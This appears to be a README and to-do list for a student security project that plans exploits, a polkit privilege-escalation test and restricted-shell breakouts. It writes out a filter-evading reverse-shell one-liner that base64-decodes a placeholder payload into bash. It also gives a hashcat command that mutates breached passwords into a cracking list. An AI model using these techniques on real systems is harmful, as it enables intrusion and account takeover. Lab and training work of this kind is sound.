# BAU-project
## TODO
1. Finish UI
2. Nabil create a docker image
3. Prepare exploits
4. Documentation :(
5. Enhance ProgramDownloader and test BoF attack
6. polkit 2022 exploit test
7. Restricted ssh shells (break out using python and tmux)
999. after finally ( apt install forensics-all) (optional)

### PakageDownloader.c
```bash
# Reverse shell command
echo${IFS}<BASE64-Encoded-Payload>|base64${IFS}-d|bash
```
## Breach similation
```
https://pastebin.com/UycbfwRP
```
## Password list
Download: https://github.com/clem9669/hashcat-rule/blob/master/clem9669_medium.rule
```
# mohammad_threats2022 (sample in PassFromBreach.txt )
hashcat -r clem9669_medium.rule --stdout PassFromBreach.txt > output.txt
```
